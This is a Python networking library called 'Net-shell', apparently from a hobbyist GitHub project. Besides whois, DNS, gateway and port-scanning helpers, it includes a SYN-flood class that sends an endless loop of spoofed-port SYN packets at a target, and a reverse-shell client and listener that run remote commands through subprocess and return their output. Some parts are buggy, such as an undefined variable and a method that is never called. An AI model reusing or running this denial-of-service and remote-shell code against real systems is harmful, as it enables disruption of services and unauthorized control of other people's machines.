import subprocess
import requests
import subprocess
import scapy
import socket       
import http
import requests
import sys 
import platform
import os
import ipaddress
from datetime import datetime
import split
import struct
import binascii
import psutil
import time
import logo
from ipwhois import IPWhois
import colorama
from colorama import Fore 
colorama.init(autoreset=True)
from scapy.all import *
# Net-shell project  @alegrarsio2005@gmail.com 

netsh_pkg = os.path.dirname(__file__)

con_list = []
"""
    (c) Copyright Alegrarsio gifta lesmana

    https://github.com/alegarsio

    
    
                                                      
    o          o                 o               ((  o  ))        
    <|\        <|>               <|>                <|>        
    / \\o      / \               < >                / >        
    \o/ v\     \o/    o__  __o    |          __o__  \o__ __o   
    |   <\     |    /v      |>   o__/_     />  \    |     v\  
    / \    \o  / \  />      //    |         \o      / \     <\ 
    \o/     v\ \o/  \o    o/      |          v\     \o/     o/ 
    |       <\ |    v\  /v __o   o           <\     |     <|  
    / \        < \    <\/> __/>   <\__   _\o__</    / \    / \ 


                                                        Network Module                                                                      
                                                            
                                                            """
class connection:
    def connect(address , port):
        try:
            socket.gethostbyname(address)
            con = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
            while True :
                try:
                    con.connect((address , port))
                    con_list.append(address)
                    con_list.append(port)
                    return f"[+] Connected to {address} : {port} "
                except Exception as err:
                    return f"[!] Failed to connect {address} : {port}"
        except ConnectionRefusedError : return f"Connection Refused"
        except KeyboardInterrupt : pass
        except PermissionError : return "Permission Error"
        except TimeoutError : return f"Failed to connect {address} : {port}"
        
    def status(address , port = int ):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                addr = socket.gethostbyname(address)
                result = s.connect_ex((addr,port))
                if result == 0:
                    return f"HOST {addr} : {port} IS UP"
                else :
                    return f"HOST {addr} : {port} IS DOWN"
        except socket.error as err: 
            return "Failed to create socket [Failed]"

    def _list_():
        return con_list

"""Get module help user to find internal network information i.e Address , 
Gateway , IP_type 

"""
class syn_attack:
    def run(dst_t , port = int):
        if sys.platform.startswith('win'.lower()) : 
            return
        else : 
            addr = socket.gethostbyname(dst_t)
            target = IP(dst = addr)
            tcp = TCP(sport=RandShort(), dport=port, flags="S")
            raw = Raw(b"X"*1024)
            p = target / tcp / raw
            send (p , loop =1 , verbose = 0)


class reverse:
    def host(address , port = int):
        try:
            buffer = 1024 * 128 
            seperator = "<sep>"
            s = socket.socket()
            s.bind((address , port))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.listen(5)
            print("Listening as {addr} : {prt}".format(addr = address , prt = port))
            client_socket, client_address = s.accept()
            print(f"{client_address[0]}:{client_address[1]} Connected!")
            wd = client_socket.recv(buffer).decode()
            
            while True:
            
                command = input(f"{cwd} $> ")
                if not command.strip():
                    
                    continue
            
                client_socket.send(command.encode())
                if command.lower() == "exit":
                
                    break
                
                output = client_socket.recv(buffer).decode()
                print("output:", output)
            
                results, cwd = output.split()
            
                print(results)

            client_socket.close()

            s.close()
        except KeyboardInterrupt : pass
        except OSError : raise PermissionError("Permmision denied")
    def client(address , port = int):
       try:
           con = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
           con.connect((address , port))
           while True:
               cmd = con.recv(1024).decode()
               if cmd.lower == 'exit':
                   break
               out = subprocess.getoutput(cmd)
               con.send(out.encode())
       except ConnectionRefusedError : pass
       except KeyboardInterrupt : pass
       except PermissionError : print("Permission denied")
class get:
    def osbyaddress(address):
        addr = socket.gethostbyname(address)
        obj = IPWhois(addr)
        results = obj.lookup_whois()
        if 'asn_description' in results:
            return results['asn_description']
        else:
            return "OS not found"
    def ip_type(address):
        try:
            ip_object = ipaddress.ip_address(address)
            if isinstance(ip_object,ipaddress.IPv4Address):
                return "V4"
            elif isinstance(ip_object,ipaddress.IPv6Address):
                return "V6"
            else :
                return "Invalid IP addres"
        except ValueError: return "Invalid Ip address"
    def ipaddress():
        return socket.gethostbyname(socket.gethostname())
    def hostname():
        return socket.gethostname()
    def gateway():
        if sys.platform.startswith("win".lower()):
            try:
                runner = subprocess.run(['ipconfig','/all'],capture_output= True , text= True)
                std_out = runner.stdout
                std_gateway = std_out[std_out.find('Default Gateway'):].split('\n')[0]
                return std_gateway.split(':')[-1].strip()           
            except OSError: 
                return "Permission denied"
        elif sys.platform.startswith("linux".lower()):
            try:
                runner = subprocess.run(['ip','route','show','default'] , capture_output= True , text = True)
                std_out = runner.stdout
                gateway_info = std_out.split()
                if 'via' in gateway_info:
                    index = gateway_info.index('via') + 1
                    return gateway_info[index]
                else:
                    return "Gateway information not found"
            except OSError :
                return "Permission denied"
    def open_port(address , port_range):
        head = "Port Service\n"  
        print(head)
        for port in range(port_range[0] , port_range[1] + 1):
            try :
                s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
                socket.setdefaulttimeout(1)
                socket.gethostbyname(address)
                result = s.connect_ex((address , port))
                if result == 0:
                    body = "{p}".format(p = port),'{sn}'.format(sn = socket.getservbyport(port))
                    print(body,"\n")
                else : pass
            except KeyboardInterrupt : return "Process stopped"
            except socket.gaierror : raise socket.gaierror('Invalid IP address')
            except socket.herror : raise socket.herror('Server can not responded')




# this class below is for server operation 
# 
class server():
    def host(address = str , port = int):
        try:
            if address == "a" and port == 1:
                port = 9000
                address = get.ipaddress()
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind((address, port))
                s.listen()
                conn, addr = s.accept()
                with conn:
                    print(f"Connected by {addr}")
                    while True:
                        data = conn.recv(1024)
                        if not data:
                            break
                        conn.sendall(data)
        except OSError: print("Permission denied")
    def client(address = str , port = int , msg = str):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((address, port))
                s.sendall(msg)
                data = s.recv(1024)


                print(f"Received {data!r}")
        except : pass
    def simhttpd(address , port):
        if address == "auto" and port == "auto":
            try:
                address = get.ipaddress()
                port = "9000"
                os.system("python -m http.server {p} -b {addr}".format(p = port , addr = address))
            except PermissionError : pass
            except KeyboardInterrupt : pass
        else :
            try:
                 os.system("python -m http.server {p} -b {addr}".format(p = port , addr = address))
            except KeyboardInterrupt : pass

class scanner:
    from scapy.all import ARP, Ether, srp
    def net_usage_scanner():
       net = psutil.net_io_counters(pernic=True)
       return net
    def scan_usage(interval):
        network_stats = {}
        while True:
            network_stats = scanner.net_usage_scanner()
            time.sleep(interval)
            return network_stats
    def wifi_list():
        if sys.platform.startswith('win'.lower()):
            command = 'netsh wlan show networks'
            return subprocess.check_output(command , shell=True , text = True)
        else :
            l_command = "nmcli device wifi list"
            return subprocess.check_output(l_command , shell=True , text = True)
    def request_scanner(host):
        domain = requests.get(host)
        return domain.status_code()
    def netscan(address):
        time = datetime.now()
        s = socket.socket(socket.AF_INET ,  socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = s.connect_ex((address,135))
        if result == 0:
            return 1
        else :
            return 0
    def net_scanner(address , st = int , end = int ):
        try:
            get_space = address.split('.')
            a = '.'
            iterates = get_space[0] + a + get_space[1] + a + get_space[2] + a
            ends = end +  1;
            for ip in range(st,ends):
                addr = iterates + str(ip)
                if (scanner.netscan(addr)):
                    print(addr , "Live")
        except KeyboardInterrupt : pass
    def dns_scanner(host):
        import dns.resolver
        record_types = ["A","AAAA","NS","CNAME","MX","PTR","SOA","TXT"]
        domain = host
        for records in record_types:
            try:
                answer = dns.resolver.resolve(domain , records)
                print(f'\n {records} Record')
                print(f'-'*30)
                for server in answer:
                    print(server.to_text())
            except dns.resolver.NoAnswer:pass
            except dns.resolver.LifetimeTimeout: print('Time out [Error]')
            except dns.resolver.NXDOMAIN : print('Invalid host/website [CTRL + C] to stop')
    def port_scanner(address , port_range):
            head = "Port Service\n"  
            print(head)
            for port in range(port_range[0] , port_range[1] + 1):
                try :
                    s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
                    socket.setdefaulttimeout(1)
                    socket.gethostbyname(address)
                    result = s.connect_ex((address , port))
                    if result == 0:
                        body = "{p}".format(p = port),'{sn}'.format(sn = socket.getservbyport(port))
                        print(body,"\n")
                    else : pass
                except KeyboardInterrupt : return "Process stopped"
                except socket.gaierror : raise socket.gaierror('Invalid IP address')
                except socket.herror : raise socket.herror('Server can not responded')